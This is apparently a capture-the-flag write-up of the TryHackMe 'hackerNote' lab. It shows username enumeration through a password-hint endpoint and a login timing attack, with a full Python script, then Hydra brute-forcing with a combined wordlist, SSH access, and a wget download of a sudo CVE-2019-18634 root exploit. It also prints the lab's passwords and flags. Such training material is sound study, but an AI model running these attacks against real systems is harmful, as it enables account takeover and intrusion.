----
A custom webapp, introducing username enumeration, custom wordlists and a basic privilege escalation exploit.
---

![](https://i.imgur.com/52GtMD0.png)

### Reconnaissance

 Start Machine

You're presented with a machine. Your first step should be recon. Scan the machine with nmap, work out what's running.

Answer the questions below

```json
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.247.168 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.247.168:22
Open 10.10.247.168:80
Open 10.10.247.168:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 11:58 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:58
Completed Parallel DNS resolution of 1 host. at 11:58, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:58
Scanning 10.10.247.168 [3 ports]
Discovered open port 80/tcp on 10.10.247.168
Discovered open port 8080/tcp on 10.10.247.168
Discovered open port 22/tcp on 10.10.247.168
Completed Connect Scan at 11:58, 0.21s elapsed (3 total ports)
Initiating Service scan at 11:58
Scanning 3 services on 10.10.247.168
Completed Service scan at 11:58, 13.08s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.247.168.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 6.23s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.75s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
Nmap scan report for 10.10.247.168
Host is up, received user-set (0.21s latency).
Scanned at 2023-03-16 11:58:27 EDT for 20s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10a6953462b0562a38157758f4f36cac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8+mhh7M4EpPVA2+5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ+/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io+Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP+fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A+n4J
|   256 6f1827a4e7219d4e6d55b3acc52dd5d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=
|   256 2dc31b584dc35d8e6af6379dcaad207c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z
80/tcp   open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - hackerNote
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - hackerNote
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.60 seconds
```

Which ports are open? (in numerical order)

*22,80,8080*

What programming language is the backend written in?

Use nmap -sV to fingerprint the service version.

*Go*

### Investigate

Now that you know what's running, you need to investigate. With webapps, the normal process is to click around. Create an account, use the web app as a user would and play close attention to details.

Answer the questions below

```
view-source:http://10.10.247.168/main.js

console.log("Hello, World!");
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/json'
            // 'Content-Type': 'application/x-www-form-urlencoded',
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: JSON.stringify(data) // body data type must match "Content-Type" header
    });
    return await response.json(); // parses JSON response into native JavaScript objects
}
async function getData(url = '') {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'GET', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
    });
    return await response.json(); // parses JSON response into native JavaScript objects
}
async function whoami() {
    console.log(getData("/api/user/whoami"));
}

async function login() {
    const username = document.querySelector("#username").value;
    const password = document.querySelector("#password").value;
    const button = document.querySelector("#loginButton");
    button.disabled = true;
    document.querySelector("#status").textContent = "Logging you in..."
    const response = await postData("/api/user/login", { username: username, password: password });
    console.log(response);
    if (response.status !== undefined && response.status !== "success") {
        document.querySelector("#status").textContent = "";
        document.querySelector("#errorMessage").textContent = response.status
        button.disabled = false;
        return
    }
    if (response.SessionToken !== undefined) {
        window.location = "/notes"
    }
}
async function forgotPassword() {
    //Based on username, find return password hint
    var username = document.querySelector("#username").value;
    const response = await getData("/api/user/passwordhint/" + username)
    console.log(response)
    if (response.hint !== undefined && response.hint !== "success") {
        document.querySelector("#passwordHint").textContent = "Hint: "+response.hint
        return
    }
}
function getCookie(name) {
    var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
    return v ? v[2] : null;
}
function onLoad() {
    const session = getCookie("SessionToken");
    console.log(session)
    if (session !== null && session !== "") {
        window.location = "/notes"
    }
}
async function createUser() {
    const button = document.querySelector("#userCreateButton");
    const username = document.querySelector("#usernameCreate").value;
    const password = document.querySelector("#passwordCreate").value;
    const passwordHint = document.querySelector("#passwordHintCreate").value;
    const user = {
        Username: username,
        Password: password,
        PasswordHint: passwordHint
    };
    document.querySelector("#statusCreation").textContent = "Creating your account";
    button.disabled = true;
    const response = await postData("/api/user/create", user);
    console.log(response)
    if (response.status !== undefined) {
        if (response.status !== "success") {
            document.querySelector("#statusCreation").textContent = "";
            document.querySelector("#errorMessage").textContent = response.status
            return
        }
        document.querySelector("#statusCreation").textContent = "";
        document.querySelector("#statusCreation").textContent = "Successfully created a user account";
        document.querySelector("#usernameCreate").value = "";
        document.querySelector("#passwordCreate").value = "";
        document.querySelector("#passwordHintCreate").value = "";
        return
    }
    document.querySelector("#statusCreation").textContent = "";
    document.querySelector("#errorMessage").textContent = "Something went wrong..."
}

API

Invalid Username Or Password 

rot13 password reset

 Hint: ..

using burp

REQUEST

POST /api/user/login HTTP/1.1

Host: 10.10.247.168

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/json

Origin: http://10.10.247.168

Content-Length: 41

Connection: close

{"username":"wittya","password":"wittya"}


RESPONSE

HTTP/1.1 200 OK

Content-Type: application/json

Date: Thu, 16 Mar 2023 16:06:42 GMT

Content-Length: 42

Connection: close

{"status":"Invalid Username Or Password"}

REQUEST

GET /api/user/passwordhint/witty HTTP/1.1

RESPONSE

HTTP/1.1 200 OK

Content-Type: application/json

Date: Thu, 16 Mar 2023 16:07:48 GMT

Content-Length: 32

Connection: close

{"hint":"a","username":"witty"}

```


Create your own user account

 Completed

Log in to your account

 Completed

Try and log in to an invalid user account  

 Completed

Try and log in to your account, with an incorrect password.

 Completed

Notice the timing difference. This allows user enumeration

There's another way to check if a username is valid on this webapp. Can you find it? Additional hint: cnffjbeq erfrg

 Completed


### Exploit

**Use the timing attack**

Now that we know there's a timing attack, we can write a python script to exploit it.

The first step is working out how login requests work. You can use Burpsuite for this, but I prefer to use Firefox dev tools as I don't have to configure any proxies.

Here we can see the login is a POST request to /api/user/login. This means we can make this request using CURL, python or another programming language of your choice.

![](https://i.imgur.com/swXlKKU.png)

In python, we can use this code and the Requests library to send this request as follows:

creds = {"username":username,"password":"invalidPassword!"}
response = r.post(URL,json=creds)

The next stage is timing this. Using the "time" standard library, we can work out the time difference between when we send the request and when we get a response. I've moved the login request into it's own function called doLogin.

startTime = time.time()
doLogin(user)
endTime = time.time()

The next step is now to repeat this for all usernames in the username list. This can be done with a series of for loops. The first will read usernames from a file into a list, and the second will test each of these usernames and see the time taken to respond. For my exploit, I decided that times within 10% of the largest time were likely to be valid usernames.  
  

**Why does the time taken change?**

The backend is intentionally poorly written. The server will only try to verify the password of the user if it receives a correct username. The psuedocode to explain this better is below.

HackerNote Login Code

```python
def login(username, password):
    if username in users: ##If it's a valid username
        login_status = check_password(password) ##This takes a noticeable amount of time
        if login_status:
            return new_session_token()
        else:
            return "Username or password incorrect"
    else:
        return "Username or password incorrect"
```

Pre-written exploits in Golang and Python are available here: [https://github.com/NinjaJc01/hackerNoteExploits](https://github.com/NinjaJc01/hackerNoteExploits)[](https://github.com/NinjaJc01/hackerNoteExploits)

Use the Honeypot capture or Names/names.txt from [https://github.com/danielmiessler/SecLists/tree/master/Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames). The shorter the list is, the faster the exploit will complete. (Hint: one of those wordlists is shorter.)

**NOTE:** The Golang exploit is not reliable but it is faster. If you get invalid usernames, try re-running it after a minute or switching to the python exploit.

Answer the questions below

```
┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
└─$ head names.txt              
witty
aaliyah
aaren
aarika
aaron
aartjan
aarushi
abagael
abagail
abahri

using burp intruder

GET /api/user/passwordhint/§witty§ HTTP/1.1

Host: 10.10.247.168

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cache-Control: max-age=0


Response
HTTP/1.1 200 OK

Content-Type: application/json

Date: Thu, 16 Mar 2023 17:09:25 GMT

Content-Length: 32

Connection: close

{"hint":"a","username":"witty"}

Response

HTTP/1.1 200 OK

Content-Type: application/json

Date: Thu, 16 Mar 2023 17:12:29 GMT

Content-Length: 74

Connection: close

{"hint":"My favourite colour and my favourite number","username":"james"}

We found another username james :) (2 min)


┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
└─$ cat hackernote.py  
#!/usr/bin/env python3
import sys
import requests
import time

def main():
    host = '10.10.247.168'

    with open(sys.argv[1]) as f:
        usernames = f.readlines()
    usernames = [x.strip() for x in usernames] 

    for username in usernames:
        start = time.time()
        creds = {"username":username,"password":"notimportant"}
        r = requests.post("http://{}/api/user/login".format(host), data=creds)
        done = time.time()
        elapsed = done - start
        if elapsed > 1.2:
            print("[*] Valid user found: {}".format(username))

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: {} /path/usernames/file.txt".format(sys.argv[0]))
        sys.exit(1) 
    main()

┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
└─$ sudo nano j_names.txt  
                                                                                    
┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
└─$ more j_names.txt 
witty
jaan
jabir
jacalyn
jace
jacek
jacenta
jacinda
jacinta
jacintha
jacinthe
jack
jackelyn
jacki
jackie
jacklin
jacklyn
jackquelin
jackqueline
jackson
jacky
jaclin
jaclyn
jacob
jacoby
jacque
jacquelin
jacqueline
jacquelyn
jacquelynn
jacquenetta
jacquenette
jacques
jacquetta
jacquette
jacqui
jacquie
jacynth
jacynthe
jad
jada
jade
jaden
jadon
jadyn
jae
jaelynn
jaffer
jag
jagat
jagdev
jagdish
jagger
jagjeet
jagjit
jago
jagriti
jai
jaida
jaiden
jaime
jaimie
jaina
jaine
jak
jake
jakob
jalen
jamal
jaman
james
james_michael

┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
└─$ sudo python3 hackernote.py /usr/share/seclists/Usernames/Names/j_names.txt
[*] Valid user found: witty
[*] Valid user found: james

Yep is the same


```

Try to write a script to perform a timing attack.

If you get stuck, re-read the section on using the timing attack or use an exploit from https://github.com/NinjaJc01/hackerNoteExploits

How many usernames from the list are valid?

If you get this wrong, try testing the usernames manually and seeing how quickly they return. If it's more or less instant, they're not valid.

*1*

What are/is the valid username(s)?

*james*

### Attack Passwords

 Download Task Files

**Next Step**

Now that we have a username, we need a password. Because the passwords are hashed with bcrypt and take a noticeable time to verify, bruteforcing with a large wordlist like rockyou is not feasible.  
Fortunately, this webapp has password hints!

With the username that we found in the last step, we can retrieve the password hint. From this password hint, we can create a wordlist and (more) efficiently bruteforce the user's password.

**Create your wordlist**

The password hint is "my favourite colour and my favourite number", so we can get a wordlist of colours and a wordlist of digits and combine them using Hashcat Util's Combinator which will give us every combination of the two wordlists. Using this wordlist, we can then use Hydra to attack the login API route and find the password for the user. Download the attached wordlist files, look at them then combine them using hashcat-util's combinator.  
Hashcat utils can be downloaded from: [https://github.com/hashcat/hashcat-utils/releases](https://github.com/hashcat/hashcat-utils/releases)[](https://github.com/hashcat/hashcat-utils/releases)  
Either add these to your PATH, or run them from the folder.  
We want to use the Combinator.bin binary, with colors.txt and numbers.txt as the input. The command for this is (assuming you're in the directory with the binaries and have copiesd the txt files into that directory):

./combinator.bin colors.txt numbers.txt > wordlist.txt

This will then give you a wordlist to use for Hydra.  
  

**Attack the API**

The HTTP POST request that we captured earlier tells us enough about the API that we can use Hydra to attack it.  
The API is actually designed to either accept Form data, or JSON data. The frontend sends JSON data as a POST request, so we will use this. Hydra allows attacking HTTP POST requests, with the HTTP-POST module. To use this, we need:

-   Request Body - JSON
    
    {"username":"admin","password":"admin"}
    
-   Request Path -
    
    /api/user/login
    
-   Error message for incorrect logins -
    
    "Invalid Username Or Password"
    

The command for this is (replace the parts with angle brackets, you will need to escape special characters):

	hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ unzip wordlists.zip 
Archive:  wordlists.zip
 extracting: colors.txt              
 extracting: numbers.txt

┌──(witty㉿kali)-[~/Downloads]
└─$ unzip hashcat-utils-1.9.zip 
Archive:  hashcat-utils-1.9.zip
5f4f35d94b0229c41e61b2fd369c016b71ff9641
   creating: hashcat-utils-1.9/
 extracting: hashcat-utils-1.9/.gitignore  
  inflating: hashcat-utils-1.9/CHANGES  
  inflating: hashcat-utils-1.9/LICENSE  
  inflating: hashcat-utils-1.9/README.md  
   creating: hashcat-utils-1.9/bin/
 extracting: hashcat-utils-1.9/bin/.hold  
   creating: hashcat-utils-1.9/src/
  inflating: hashcat-utils-1.9/src/Makefile  
  inflating: hashcat-utils-1.9/src/cap2hccapx.c  
  inflating: hashcat-utils-1.9/src/cleanup-rules.c  
  inflating: hashcat-utils-1.9/src/combinator.c  
  inflating: hashcat-utils-1.9/src/combinator3.c  
  inflating: hashcat-utils-1.9/src/combipow.c  
  inflating: hashcat-utils-1.9/src/cpu_rules.c  
  inflating: hashcat-utils-1.9/src/cpu_rules.h  
  inflating: hashcat-utils-1.9/src/ct3_to_ntlm.c  
  inflating: hashcat-utils-1.9/src/cutb.c  
  inflating: hashcat-utils-1.9/src/deskey_to_ntlm.pl  
  inflating: hashcat-utils-1.9/src/expander.c  
  inflating: hashcat-utils-1.9/src/gate.c  
  inflating: hashcat-utils-1.9/src/generate-rules.c  
  inflating: hashcat-utils-1.9/src/hcstat2gen.c  
  inflating: hashcat-utils-1.9/src/hcstatgen.c  
  inflating: hashcat-utils-1.9/src/keyspace.c  
  inflating: hashcat-utils-1.9/src/len.c  
  inflating: hashcat-utils-1.9/src/mli2.c  
  inflating: hashcat-utils-1.9/src/morph.c  
  inflating: hashcat-utils-1.9/src/permute.c  
  inflating: hashcat-utils-1.9/src/permute_exist.c  
  inflating: hashcat-utils-1.9/src/prepare.c  
  inflating: hashcat-utils-1.9/src/remaining.pl  
  inflating: hashcat-utils-1.9/src/req-exclude.c  
  inflating: hashcat-utils-1.9/src/req-include.c  
  inflating: hashcat-utils-1.9/src/rli.c  
  inflating: hashcat-utils-1.9/src/rli2.c  
  inflating: hashcat-utils-1.9/src/rp_cpu.h  
  inflating: hashcat-utils-1.9/src/rules_optimize.c  
  inflating: hashcat-utils-1.9/src/seprule.pl  
  inflating: hashcat-utils-1.9/src/splitlen.c  
  inflating: hashcat-utils-1.9/src/strip-bsn.c  
  inflating: hashcat-utils-1.9/src/strip-bsr.c  
  inflating: hashcat-utils-1.9/src/tmesis-dynamic.pl  
  inflating: hashcat-utils-1.9/src/tmesis.pl  
  inflating: hashcat-utils-1.9/src/topmorph.pl  
  inflating: hashcat-utils-1.9/src/utils.c 

┌──(witty㉿kali)-[~/Downloads]
└─$ locate combinator.bin
/usr/lib/hashcat-utils/combinator.bin

┌──(witty㉿kali)-[~/Downloads]
└─$ /usr/lib/hashcat-utils/combinator.bin colors.txt numbers.txt > wordlist_hackernote
                                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ wc -l wordlist_hackernote 
180 wordlist_hackernote

┌──(witty㉿kali)-[~/Downloads]
└─$ more wordlist_hackernote 
amber0
amber1
amber2
amber3
amber4
amber5
amber6
amber7
amber8
amber9
beige0
beige1
beige2
beige3
beige4
beige5
beige6
beige7
beige8
beige9
black0
black1
black2
black3
black4
black5
black6
black7
black8
black9
blue0
blue1
blue2
blue3
blue4
blue5
blue6
blue7
blue8
blue9
brown0
brown1
brown2
brown3
brown4
brown5
brown6
brown7
brown8
brown9
crimson0
crimson1
crimson2
crimson3
crimson4
crimson5
crimson6
crimson7
crimson8
crimson9
cyan0
cyan1
cyan2
cyan3
cyan4
cyan5
cyan6
cyan7
cyan8
cyan9
gray0
gray1
gray2
gray3
gray4
gray5
gray6
gray7
gray8
gray9
green0
green1
green2
green3
green4
green5
green6
green7
green8
green9
indigo0
indigo1
indigo2
indigo3
indigo4
indigo5
indigo6
indigo7
indigo8
indigo9
magenta0
magenta1
magenta2
magenta3
magenta4
magenta5
magenta6
magenta7
magenta8
magenta9
orange0
orange1
orange2
orange3
orange4
orange5
orange6
orange7
orange8
orange9
pink0
pink1
pink2
pink3
pink4
pink5
pink6
pink7
pink8
pink9
purple0
purple1
purple2
purple3
purple4
purple5
purple6
purple7
purple8
purple9
red0
red1
red2
red3
red4
red5
red6
red7
red8
red9
violet0
violet1
violet2
violet3
violet4
violet5
violet6
violet7
violet8
violet9
white0
white1
white2
white3
white4
white5
white6
white7
white8
white9
yellow0
yellow1
yellow2
yellow3
yellow4
yellow5
yellow6
yellow7
yellow8
yellow9

┌──(witty㉿kali)-[~/Downloads]
└─$ hydra -l james -P wordlist_hackernote 10.10.247.168 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-16 14:08:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
[DATA] attacking http-post-form://10.10.247.168:80/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password
[STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active
[80][http-post-form] host: 10.10.247.168   login: james   password: blue7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-16 14:09:26

using burp intruder

lenght different 265

HTTP/1.1 200 OK

Content-Type: application/json

Set-Cookie: SessionToken=6481deabea9cee5ddae59dcc34e0f55b; Path=/

Date: Thu, 16 Mar 2023 18:11:55 GMT

Content-Length: 71

Connection: close

{"SessionToken":"6481deabea9cee5ddae59dcc34e0f55b","status":"success"}

after login

HTTP/1.1 200 OK

Content-Type: application/json

Date: Thu, 16 Mar 2023 18:14:37 GMT

Content-Length: 125

Connection: close



[{"noteID":1,"userID":1,"noteTitle":"My SSH details","noteContent":"So that I don't forget, my SSH password is dak4ddb37b"}]

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh james@10.10.247.168       
The authenticity of host '10.10.247.168 (10.10.247.168)' can't be established.
ED25519 key fingerprint is SHA256:0Fb40mE1AmcHWbg2H7/8Afq+0Uk5vLB/UrPPvJ9AxLM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.247.168' (ED25519) to the list of known hosts.
james@10.10.247.168's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Mar 16 18:15:43 UTC 2023

  System load:  0.1               Processes:           88
  Usage of /:   49.2% of 9.78GB   Users logged in:     0
  Memory usage: 10%               IP address for eth0: 10.10.247.168
  Swap usage:   0%


59 packages can be updated.
0 updates are security updates.


Last login: Mon Feb 10 11:58:27 2020 from 10.0.2.2
james@hackernote:~$ id;pwd
uid=1001(james) gid=1001(james) groups=1001(james)
/home/james
james@hackernote:~$ ls
user.txt
james@hackernote:~$ cat user.txt
thm{56911bd7ba1371a3221478aa5c094d68}


```

Form the hydra command to attack the login API route

If you're struggling with JSON, the API route also accepts form data, which is easier to use with Hydra.

 Completed


How many passwords were in your wordlist?

wc, look for number of lines

*180*

What was the user's password?

*blue7*

Login as the user to the platform

 Completed

What's the user's SSH password?

*dak4ddb37b*

Log in as the user to SSH with the credentials you have.

 Completed

What's the user flag?

*thm{56911bd7ba1371a3221478aa5c094d68}*

### Escalate

**Enumeration of privileges**

Now that you have an SSH session, you can grab the user flag. But that shouldn't be enough for you, you need root.  
A good first step for privilege escalation is seeing if you can run sudo. You have the password for the current user, so you can run the command:

sudo -l

This command tells you what commands you can run as the superuser with sudo. Unfortunately, the current user cannot run any commands as root. You may have noticed, however, that when you enter your password you see asterisks. This is not default behaviour. There was a recent CVE released that affects this configuration. The setting is called pwdfeedback.

Answer the questions below

```
james@hackernote:~$ sudo -l
[sudo] password for james: **********

**** CVE

┌──(witty㉿kali)-[~/Downloads]
└─$ cd sudo-cve-2019-18634   
                                                                                     
┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
└─$ ls
exploit  exploit.c  LICENSE  Makefile  README.md

┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.247.168 - - [16/Mar/2023 14:41:29] "GET /exploit HTTP/1.1" 200 -

james@hackernote:~$ cd /tmp
james@hackernote:/tmp$ wget http://10.8.19.103:1234/exploit
--2023-03-16 18:41:31--  http://10.8.19.103:1234/exploit
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 841784 (822K) [application/octet-stream]
Saving to: ‘exploit’

exploit           100%[============>] 822.05K   284KB/s    in 2.9s    

2023-03-16 18:41:34 (284 KB/s) - ‘exploit’ saved [841784/841784]

james@hackernote:/tmp$ ./exploit
-bash: ./exploit: Permission denied
james@hackernote:/tmp$ chmod +x exploit
james@hackernote:/tmp$ ./exploit 
[sudo] password for james: 
Sorry, try again.
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
thm{af55ada6c2445446eb0606b5a2d3a4d2}


```

What is the CVE number for the exploit?

All caps, from 2019.

*CVE-2019-18634*

Find the exploit from [https://github.com/saleemrashid/](https://github.com/saleemrashid/)[](https://github.com/saleemrashid/) and download the files.

Git clone, or download as zip and extract.

Completed

Compile the exploit from Kali linux.

cd into the folder and run "make"

 Completed

SCP the exploit binary to the box.

 Completed

Run the exploit, get root.

 Completed

What is the root flag?

*thm{af55ada6c2445446eb0606b5a2d3a4d2}*

### Comments on realism and Further Reading

**Web app**

This room was designed to be more realistic and less CTF focused. The logic behind the timing attack is mentioned in OWASP's authentication section, and a fairly similar timing attack existed on OpenSSH, allowing username enumeration. I've included links to this in the Further Reading section

Password hints in webapps are normally considered bad practice, but large companies still often include them. Adobe suffered a large databreach affecting users of Creative Cloud and decryption of the passwords was made much easier due to the password hints also included in the breach.  
  

**Privilege** **Escalation**

The privilege escalation for this box is a real world CVE vulnerability, and affected the default configurations of sudo on macOS, Linux Mint and ElementaryOS.

**Further reading**

﻿**Timing attacks on logins**[https://seclists.org/fulldisclosure/2016/Jul/51](https://seclists.org/fulldisclosure/2016/Jul/51)  
[https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/](https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/)[](https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/)  
[https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)](https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002))

**Adobe Password Breach  
**[https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/](https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/)

[](https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/)

**Sudo CVE**  
[https://dylankatz.com/Analysis-of-CVE-2019-18634/](https://dylankatz.com/Analysis-of-CVE-2019-18634/)[](https://dylankatz.com/Analysis-of-CVE-2019-18634/)  
[https://nvd.nist.gov/vuln/detail/CVE-2019-18634](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)[](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)  
[https://tryhackme.com/room/sudovulnsbof](https://tryhackme.com/room/sudovulnsbof)

Answer the questions below

Read, explore, learn.

 Completed


[[Watcher]]